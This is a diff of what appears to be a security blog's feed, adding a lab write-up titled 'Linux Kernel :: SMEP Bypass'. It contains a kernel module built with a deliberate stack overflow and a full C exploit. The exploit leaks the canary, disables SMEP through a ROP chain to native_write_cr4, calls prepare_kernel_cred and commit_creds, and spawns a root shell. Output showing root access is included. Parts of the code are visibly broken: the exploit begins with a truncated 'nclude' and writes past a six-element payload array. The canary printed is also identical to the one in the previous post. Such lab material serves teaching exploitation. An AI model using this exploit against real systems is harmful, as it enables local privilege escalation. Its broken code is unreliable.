@@ -239,6 +239,219 @@ uid=1000(ctf) gid=1000 groups=1000
 [*] canary @ 0xb30ee19bbcd24b00
 /home/ctf/linux-kernel-exp/ret2usr # id
 uid=0(root) gid=0
+</code></pre>]]></content></item><item><title>Linux Kernel :: SMEP Bypass</title><link>https://anvbis.github.io/posts/linux-kernel-smep-bypass/</link><pubDate>Fri, 10 Dec 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-smep-bypass/</guid><description>Environment Setup #!/bin/bash # build root fs pushd fs find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz popd # launch /usr/bin/qemu-system-x86_64 \ -kernel linux-5.4/arch/x86/boot/bzImage \ -initrd $PWD/initramfs.cpio.gz \ -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \ -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \ -nographic \ -monitor none \ -s \ -cpu kvm64,+smep \ -append &amp;#34;console=ttyS0 nokaslr quiet&amp;#34; ~/pwnkernel $ ./launch.sh Practice Kernel Module #include &amp;lt;linux/kernel.</description><content type="html"><![CDATA[<h2 id="environment-setup">Environment Setup</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># build root fs</span>
+pushd fs
+find . -print0 | cpio --null -ov --format<span style="color:#f92672">=</span>newc | gzip -9 &gt; ../initramfs.cpio.gz
+popd
+
+<span style="color:#75715e"># launch</span>
+/usr/bin/qemu-system-x86_64 <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -kernel linux-5.4/arch/x86/boot/bzImage <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -initrd $PWD/initramfs.cpio.gz <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -fsdev local,security_model<span style="color:#f92672">=</span>passthrough,id<span style="color:#f92672">=</span>fsdev0,path<span style="color:#f92672">=</span>$HOME <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -device virtio-9p-pci,id<span style="color:#f92672">=</span>fs0,fsdev<span style="color:#f92672">=</span>fsdev0,mount_tag<span style="color:#f92672">=</span>hostshare <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -nographic <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -monitor none <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -s <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -cpu kvm64,+smep <span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;console=ttyS0 nokaslr quiet&#34;</span>
+</code></pre></div><pre><code>~/pwnkernel $ ./launch.sh
+</code></pre><h2 id="practice-kernel-module">Practice Kernel Module</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/kernel.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/fs.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/proc_fs.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/uaccess.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+MODULE_LICENSE(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+
+<span style="color:#66d9ef">struct</span> proc_dir_entry <span style="color:#f92672">*</span>proc_entry;
+
+<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">challenge_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>off)
+{
+    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">32</span>];
+    <span style="color:#66d9ef">return</span> raw_copy_to_user(buf, data, len);
+}
+
+<span style="color:#66d9ef">static</span> ssize_t <span style="color:#a6e22e">challenge_write</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf, size_t len, loff_t <span style="color:#f92672">*</span>off)
+{
+    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">32</span>];
+    <span style="color:#66d9ef">return</span> raw_copy_from_user(data, buf, len);
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">challenge_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp)
+{
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">challenge_release</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>fp)
+{
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file_operations fops <span style="color:#f92672">=</span> {
+    .read    <span style="color:#f92672">=</span> challenge_read,
+    .write   <span style="color:#f92672">=</span> challenge_write,
+    .open    <span style="color:#f92672">=</span> challenge_open,
+    .release <span style="color:#f92672">=</span> challenge_release
+};
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init_module</span>(<span style="color:#66d9ef">void</span>)
+{
+    proc_entry <span style="color:#f92672">=</span> proc_create(<span style="color:#e6db74">&#34;challenge&#34;</span>, <span style="color:#ae81ff">0666</span>, NULL, <span style="color:#f92672">&amp;</span>fops);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cleanup_module</span>(<span style="color:#66d9ef">void</span>)
+{
+    <span style="color:#66d9ef">if</span> (proc_entry) {
+        proc_remove(proc_entry);
+    }
+}
+</code></pre></div><pre><code>~/ $ cp challenge.c ~/pwnkernel/src/challenge.c 
+</code></pre><pre><code># add more modules here!
+obj-m = challenge.o
+KERNEL_VERSION=5.4
+
+all: 
+    echo $(OBJECTS)
+    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
+
+clean:
+    make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
+</code></pre><pre><code>~/pwnkernel $ ./build.sh
+...
+
+~/pwnkernel $ ./launch.sh
+...
+
+/ # id
+uid=0(root) gid=0
+/ # insmod ./challenge.ko
+</code></pre><h2 id="bypassing-smep-protection">Bypassing SMEP Protection</h2>
+<pre><code>/ # cat /proc/kallsyms | grep native_write_cr4
+ffffffff8102dab0 T native_write_cr4
+</code></pre><pre><code>pwndbg&gt; p $cr4
+$1 = [ SMEP OSXMMEXCPT OSFXSR PGE MCE PAE PSE ]
+pwndbg&gt; p/x $cr4
+$2 = 0x1006f0
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rop_chain[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81001518</span>; <span style="color:#75715e">// pop rdi; ret
+</span><span style="color:#75715e"></span>rop_chain[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6f0</span>;              <span style="color:#75715e">// rdi = 0x6f0
+</span><span style="color:#75715e"></span>rop_chain[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8102dab0</span>; <span style="color:#75715e">// native_write_cr4
+</span></code></pre></div><h2 id="exploit-development">Exploit Development</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">nclude <span style="color:#f92672">&lt;</span>stdio.h<span style="color:#f92672">&gt;</span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;assert.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> save_ss, save_sp, save_rf, save_cs;
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>()
+{
+    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">save_user_space</span>()
+{
+    <span style="color:#75715e">/* save user-space */</span>
+    __asm__(
+        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+        <span style="color:#e6db74">&#34;mov save_ss, ss;&#34;</span>
+        <span style="color:#e6db74">&#34;mov save_sp, rsp;&#34;</span>
+        <span style="color:#e6db74">&#34;pushf;&#34;</span>
+        <span style="color:#e6db74">&#34;pop save_rf;&#34;</span>
+        <span style="color:#e6db74">&#34;mov save_cs, cs;&#34;</span>
+        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+    ); 
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">load_user_space</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> target)
+{
+    <span style="color:#75715e">/* return to user-space */</span>
+    __asm__(
+        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+        <span style="color:#e6db74">&#34;swapgs;&#34;</span>
+        <span style="color:#e6db74">&#34;mov r15, save_ss;&#34;</span>
+        <span style="color:#e6db74">&#34;push r15;&#34;</span>
+        <span style="color:#e6db74">&#34;mov r15, save_sp;&#34;</span>
+        <span style="color:#e6db74">&#34;push r15;&#34;</span>
+        <span style="color:#e6db74">&#34;mov r15, save_rf;&#34;</span>
+        <span style="color:#e6db74">&#34;push r15;&#34;</span>
+        <span style="color:#e6db74">&#34;mov r15, save_cs;&#34;</span>
+        <span style="color:#e6db74">&#34;push r15;&#34;</span>
+        <span style="color:#e6db74">&#34;mov r15, %[rip];&#34;</span>
+        <span style="color:#e6db74">&#34;push r15;&#34;</span>
+        <span style="color:#e6db74">&#34;iretq;&#34;</span>
+        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+        <span style="color:#f92672">:</span> [rip] <span style="color:#e6db74">&#34;=&amp;r&#34;</span> (target)
+    );
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">escalate_privileges</span>()
+{
+    <span style="color:#75715e">/* escalate privileges */</span>
+    __asm__(
+        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+        <span style="color:#e6db74">&#34;xor rdi, rdi;&#34;</span>
+        <span style="color:#e6db74">&#34;movabs rbx, 0xffffffff810881c0;&#34;</span>  <span style="color:#75715e">// prepare_kernel_cred
+</span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;call rbx;&#34;</span>
+        <span style="color:#e6db74">&#34;movabs rbx, 0xffffffff81087e80;&#34;</span>  <span style="color:#75715e">// commit_creds
+</span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;mov rdi, rax;&#34;</span>
+        <span style="color:#e6db74">&#34;call rbx;&#34;</span>
+        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+    );
+
+    <span style="color:#75715e">/* return to user-space */</span>
+    load_user_space((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)shell);
+}
+
+<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">leak_canary</span>(<span style="color:#66d9ef">int</span> fd)
+{
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> leak[<span style="color:#ae81ff">5</span>];
+    read(fd, leak, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>);
+    <span style="color:#66d9ef">return</span> leak[<span style="color:#ae81ff">4</span>];
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">overflow_buffer</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> canary)
+{
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[<span style="color:#ae81ff">6</span>];
+
+    payload[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> canary;
+    
+    payload[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff81001518</span>; <span style="color:#75715e">// pop rdi; ret
+</span><span style="color:#75715e"></span>    payload[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6f0</span>;              <span style="color:#75715e">// rdi = 0x6f0
+</span><span style="color:#75715e"></span>    payload[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff8102dab0</span>; <span style="color:#75715e">// native_write_cr4
+</span><span style="color:#75715e"></span>
+    payload[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)escalate_privileges;
+
+    write(fd, payload, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">6</span>);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+{
+    save_user_space();
+
+    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/challenge&#34;</span>, O_RDWR);
+    assert(fd <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+
+    <span style="color:#75715e">/* leak stack canary */</span>
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> canary <span style="color:#f92672">=</span> leak_canary(fd);
+    printf(<span style="color:#e6db74">&#34;[*] canary @ 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, canary);
+
+    overflow_buffer(fd, canary); 
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><pre><code>~/linux-kernel-exp/smep-bypass $ id
+uid=1000(ctf) gid=1000 groups=1000
+~/linux-kernel-exp/smep-bypass $ ./exploit
+[*] canary @ 0xb30ee19bbcd24b00
+/home/ctf/linux-kernel-exp/smep-bypass # id
+uid=0(root) gid=0
 </code></pre>]]></content></item><item><title>DUCTF 2020 :: Return to What's Revenge</title><link>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</link><pubDate>Tue, 17 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/ductf-2020-return-to-whats-revenge/</guid><description>Reverse Engineering Running file tells us that the target binary is a 64-bit dynamically linked linux executable.
 $ file ./return-to-whats-revenge ./return-to-whats-revenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=85709e2a953fc6f7da43f29d1dee0c5cc682a059, with debug_info, not stripped We can run pwntools' checksec tool to get a better overview of the protections the target binary has in place. Note that the only protection in place is DEP, so we&amp;rsquo;ll likely have to build a ROP chain to bypass it.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
 <p>Running <code>file</code> tells us that the target binary is a 64-bit dynamically linked linux executable.</p>
